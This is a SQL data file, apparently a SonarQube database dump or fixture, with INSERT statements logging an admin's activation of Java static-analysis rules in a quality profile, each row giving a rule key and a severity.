INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (708, '2017-11-20 07:28:39.569', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1871;ruleKey=squid:S1871;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDqRbbGRdfPp-qon');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (709, '2017-11-20 07:28:39.616', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1872;ruleKey=squid:S1872;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDrAbbGRdfPp-qoo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (710, '2017-11-20 07:28:39.672', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1905;ruleKey=squid:S1905;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDr4bbGRdfPp-qop');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (711, '2017-11-20 07:28:39.729', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1940;ruleKey=squid:S1940;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDsxbbGRdfPp-qoq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (712, '2017-11-20 07:28:39.78', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1948;ruleKey=squid:S1948;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDtkbbGRdfPp-qor');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (713, '2017-11-20 07:28:39.812', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1989;ruleKey=squid:S1989;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDuEbbGRdfPp-qos');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (714, '2017-11-20 07:28:39.861', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1994;ruleKey=squid:S1994;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDu1bbGRdfPp-qot');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (715, '2017-11-20 07:28:39.912', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2055;ruleKey=squid:S2055;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDvobbGRdfPp-qou');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (716, '2017-11-20 07:28:39.945', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2060;ruleKey=squid:S2060;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDwJbbGRdfPp-qov');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (717, '2017-11-20 07:28:39.986', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2061;ruleKey=squid:S2061;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDwybbGRdfPp-qow');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (718, '2017-11-20 07:28:40.045', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2062;ruleKey=squid:S2062;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDxtbbGRdfPp-qox');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (719, '2017-11-20 07:28:40.129', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2065;ruleKey=squid:S2065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVDzBbbGRdfPp-qoy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (720, '2017-11-20 07:28:40.201', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2066;ruleKey=squid:S2066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVD0JbbGRdfPp-qoz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (721, '2017-11-20 07:28:40.321', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2068;ruleKey=squid:S2068;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVD2BbbGRdfPp-qo0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (722, '2017-11-20 07:28:40.389', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2077;ruleKey=squid:S2077;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVD3EbbGRdfPp-qo1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (723, '2017-11-20 07:28:40.435', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2092;ruleKey=squid:S2092;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVD3zbbGRdfPp-qo2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (724, '2017-11-20 07:28:40.48', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2093;ruleKey=squid:S2093;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVD4gbbGRdfPp-qo3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (725, '2017-11-20 07:28:40.524', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2094;ruleKey=squid:S2094;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVD5MbbGRdfPp-qo4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (726, '2017-11-20 07:28:40.572', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2095;ruleKey=squid:S2095;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;param_excludedResourceTypes=;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVD58bbGRdfPp-qo5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (727, '2017-11-20 07:28:40.615', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2097;ruleKey=squid:S2097;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVD6nbbGRdfPp-qo6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (728, '2017-11-20 07:28:40.659', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2109;ruleKey=squid:S2109;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVD7TbbGRdfPp-qo7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (729, '2017-11-20 07:28:40.705', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2110;ruleKey=squid:S2110;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVD8BbbGRdfPp-qo8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (730, '2017-11-20 07:28:40.762', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2111;ruleKey=squid:S2111;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVD86bbGRdfPp-qo9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (731, '2017-11-20 07:28:40.812', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2112;ruleKey=squid:S2112;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVD9sbbGRdfPp-qo-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (732, '2017-11-20 07:28:40.845', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2114;ruleKey=squid:S2114;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVD-NbbGRdfPp-qo_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (733, '2017-11-20 07:28:40.879', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2116;ruleKey=squid:S2116;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVD-vbbGRdfPp-qpA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (734, '2017-11-20 07:28:40.944', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2118;ruleKey=squid:S2118;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVD_wbbGRdfPp-qpB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (735, '2017-11-20 07:28:40.989', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2122;ruleKey=squid:S2122;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEAdbbGRdfPp-qpC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (736, '2017-11-20 07:28:41.053', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2123;ruleKey=squid:S2123;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEBdbbGRdfPp-qpD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (737, '2017-11-20 07:28:41.127', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2127;ruleKey=squid:S2127;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVECnbbGRdfPp-qpE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (738, '2017-11-20 07:28:41.188', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2129;ruleKey=squid:S2129;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEDkbbGRdfPp-qpF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (739, '2017-11-20 07:28:41.284', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2130;ruleKey=squid:S2130;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEFEbbGRdfPp-qpG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (740, '2017-11-20 07:28:41.326', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2131;ruleKey=squid:S2131;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEFubbGRdfPp-qpH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (741, '2017-11-20 07:28:41.372', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2133;ruleKey=squid:S2133;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEGcbbGRdfPp-qpI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (742, '2017-11-20 07:28:41.417', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2134;ruleKey=squid:S2134;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEHJbbGRdfPp-qpJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (743, '2017-11-20 07:28:41.464', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2140;ruleKey=squid:S2140;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEH4bbGRdfPp-qpK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (744, '2017-11-20 07:28:41.492', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2142;ruleKey=squid:S2142;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEIUbbGRdfPp-qpL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (745, '2017-11-20 07:28:41.534', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2147;ruleKey=squid:S2147;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEI-bbGRdfPp-qpM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (746, '2017-11-20 07:28:41.578', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2151;ruleKey=squid:S2151;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEJqbbGRdfPp-qpN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (747, '2017-11-20 07:28:41.624', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2153;ruleKey=squid:S2153;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEKYbbGRdfPp-qpO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (748, '2017-11-20 07:28:41.657', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2154;ruleKey=squid:S2154;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEK5bbGRdfPp-qpP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (749, '2017-11-20 07:28:41.688', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2157;ruleKey=squid:S2157;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVELYbbGRdfPp-qpQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (750, '2017-11-20 07:28:41.738', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2159;ruleKey=squid:S2159;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEMKbbGRdfPp-qpR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (751, '2017-11-20 07:28:41.77', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2160;ruleKey=squid:S2160;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEMqbbGRdfPp-qpS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (752, '2017-11-20 07:28:41.819', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2165;ruleKey=squid:S2165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVENbbbGRdfPp-qpT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (753, '2017-11-20 07:28:41.846', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2166;ruleKey=squid:S2166;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEN2bbGRdfPp-qpU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (754, '2017-11-20 07:28:41.878', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2167;ruleKey=squid:S2167;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEOWbbGRdfPp-qpV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (755, '2017-11-20 07:28:41.922', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2168;ruleKey=squid:S2168;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEPCbbGRdfPp-qpW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (756, '2017-11-20 07:28:41.971', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2175;ruleKey=squid:S2175;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEPzbbGRdfPp-qpX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (757, '2017-11-20 07:28:42.03', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2176;ruleKey=squid:S2176;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEQtbbGRdfPp-qpY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (758, '2017-11-20 07:28:42.068', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2177;ruleKey=squid:S2177;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVERUbbGRdfPp-qpZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (759, '2017-11-20 07:28:42.154', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2178;ruleKey=squid:S2178;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVESqbbGRdfPp-qpa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (760, '2017-11-20 07:28:42.204', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2183;ruleKey=squid:S2183;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVETcbbGRdfPp-qpb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (761, '2017-11-20 07:28:42.315', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2184;ruleKey=squid:S2184;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEVLbbGRdfPp-qpc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (762, '2017-11-20 07:28:42.388', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2185;ruleKey=squid:S2185;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEWUbbGRdfPp-qpd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (763, '2017-11-20 07:28:42.432', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2186;ruleKey=squid:S2186;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEXAbbGRdfPp-qpe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (764, '2017-11-20 07:28:42.475', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2187;ruleKey=squid:S2187;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEXrbbGRdfPp-qpf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (765, '2017-11-20 07:28:42.518', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2188;ruleKey=squid:S2188;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEYWbbGRdfPp-qpg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (766, '2017-11-20 07:28:42.57', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2189;ruleKey=squid:S2189;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEZKbbGRdfPp-qph');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (767, '2017-11-20 07:28:42.626', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2200;ruleKey=squid:S2200;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEaCbbGRdfPp-qpi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (768, '2017-11-20 07:28:42.66', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2201;ruleKey=squid:S2201;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEakbbGRdfPp-qpj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (769, '2017-11-20 07:28:42.731', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2204;ruleKey=squid:S2204;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEbrbbGRdfPp-qpk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (770, '2017-11-20 07:28:42.773', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S2209;ruleKey=squid:S2209;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVEcVbbGRdfPp-qpl');
